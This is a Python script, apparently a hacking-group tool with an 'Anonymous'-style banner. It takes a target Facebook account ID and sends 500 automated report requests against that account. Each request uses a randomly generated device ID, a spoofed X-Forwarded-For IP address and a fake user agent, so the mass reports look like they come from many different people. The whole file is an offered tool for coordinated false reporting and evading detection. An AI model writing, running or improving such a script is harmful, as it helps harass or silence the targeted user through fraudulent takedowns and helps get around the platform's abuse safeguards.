#Ckr0Ck3

import requests
import random
import time
import os
from colorama import Fore
Z =  '\033[1;31m' #blue
F = '\033[2;30m' #Ckr0Ck3
B = '\033[2;36m'#Ckr0Ck3
X = '\033[1;33m' #yello
C = '\033[2;34m'#Ckr0Ck3
M = '\033[1;92m'#green
os.system('clear')
banner = Z+"""
               ``;`                              
             `,+@@@+                              
           .+@@@@@@@;                            
        `;@@@@@@@@@@@                            
       +@@@@@@@@@@@@@:                            
     ;@@@@@@@@@@@@@@@@                            
   `@@@@@@@@@@@@@@@@@@`                          
   `@@@@@@@@@@@@@@@@@@#                          
    .@@@@@@@@@@@@@@@@@@,                          
     :@@@@@@@@@@@@@@@@@@      .'@@                
      #@@@@@@@@@@@@@@@@+;  .+@@@@@                
      `@@@@@@@@@@@@@#;;+@+#@@@#:`                
       #@@@@@@@@@@';'@@@@@@@:`                    
       `@@@@@@@+;;+@@@@@##`                      
        .@@@#;;+@@@@@#+',.,'.                    
         +;;'#@@@@#+;`      ,:                    
         .#@@@@#++:  @.    ...`                  
      `'@@@@#++'. +  .#++;;+  +                  
    ,@@@@@#++:``::+   `',:+,. ,                  
  `@@@@#, #+` ',.`'.   +` ``  `,  .+              
   @@:`  ,+. ,`:``.:   '. .',+++   #              
   ``    #+`++,.`:,``    :`+@@'@@@@'    ````      
         #'`#+:`.,`:` .@@@+@#  +`.      :  `:    
         #:: +.`,.., `@@,#@':. +        :   '    
         #: ` ',:`,, @#``    + +        ' `,;    
         #: ` `:''`  @` #:.. , '        #+++:    
         #: ,     ;#'#  + :   `:         #++      
         #; '     `''         ,          '.      
         ;' '                 #         `@#      
          #.;                ;`       ,#.:;      
          `+;               '.        @   `      
           :#;            `@:        :`  `,      
            .#+;        `'+.'        +            
              .@++#'+@+@++` ;@.     '            
               `' ., ` #:`# `+.#+  :.            
                ., :  @#;.`;`:  `#@.              
                 +``,.;`@+,. '#                  
                 @' ' ;`@:+`#`;`                  
                `#+  ,'`#  :.  '                  
                ' #.  :`#` '`. +                  
                # +.  .:+: :`. .                  
               `, +,   ..+ '`   :                
               ;` #+@:,:#.;``   '                
               #'##:#+.  : `;   ;                
               #. #:      `'`   :                
                  #,        `   .     

                                        \033[1;92m{by: Kr0k3_T_TⒶsS_TrⒶ3sS}
                                        
                                        {#̸̥̬̯́̆̾͘Lú̸̺̱̮̖͊̂lzs̶̡͔̉̀eC  ▀▄Ⓐ🅽🆃🅸-̤🆂🅴🅲▄▀  #̸̥̬̯́̆̾͘A̷̪̝̠̜̣̐͛̍̈́̕ͅṇ̷̢̯̋̒͗́̕̕o̸̯̮͖͌̅̔̊n̴͖̜̜̬̝͊͗̎̋̆͑y̵̰͒̾̇m̷͕̦̳̝̈́͋̚ͅö̸̟̭̞̬̩͎́̌̇̔͂ú̸̺̱̮̖͊̂s̶̡͔̉̀   }
                                        
                                        {ᴡ3 Ⓐʀ3 Ⓐɴ0ɴʏᴍ0ᴜS ᴡ3 Ⓐʀ3 ʟ3ɢ10ɴ, ᴡ3 ᴅ0ɴ’ᴛ ꜰ0ʀɢ1ᴠ3 ᴡ3 ᴅ0ɴ’ᴛ ꜰ0ʀɢ3ᴛ ,3xp3ct uS}"""

print(banner)

# Enter the ID of the target Facebook account
account_id = input(X+"Enter the ID of the target Facebook account: ")

# Generate a list of fake device IDs, fake IP addresses, and fake user agents
devices = []
ips = []
user_agents = []
for i in range(500):
    device_id = ''.join(random.choices("0123456789abcdef", k=16))
    devices.append(device_id)
    ip_address = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    ips.append(ip_address)
    user_agent = f"Mozilla/5.0 (Windows NT {random.randint(5, 10)}.0; Win64; x64) AppleWebKit/{random.randint(500, 600)}.36 (KHTML, like Gecko) Chrome/{random.randint(60, 80)}.0.{random.randint(3000, 4000)}.{random.randint(100, 200)} Safari/{random.randint(500, 600)}.36"
    user_agents.append(user_agent)

# Set up the headers
headers = {
    "User-Agent": random.choice(user_agents),
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": f"https://www.facebook.com/{account_id}",
    "X-Forwarded-For": random.choice(ips)
}

# Send the report requests using the fake devices, IP addresses, and user agents
for device, ip, user_agent in zip(devices, ips, user_agents):
    data = {"device_id": device, "source": "profile", "reason": 1}
    headers["User-Agent"] = user_agent
    headers["X-Forwarded-For"] = ip
    response = requests.post(f"https://www.facebook.com/{account_id}/report", headers=headers, data=data)
    print(M+"(Report sent using device ID", device, "and IP address", ip, "with status code", response.status_code, '✅)')
    time.sleep(random.uniform(0.1, 0.5))
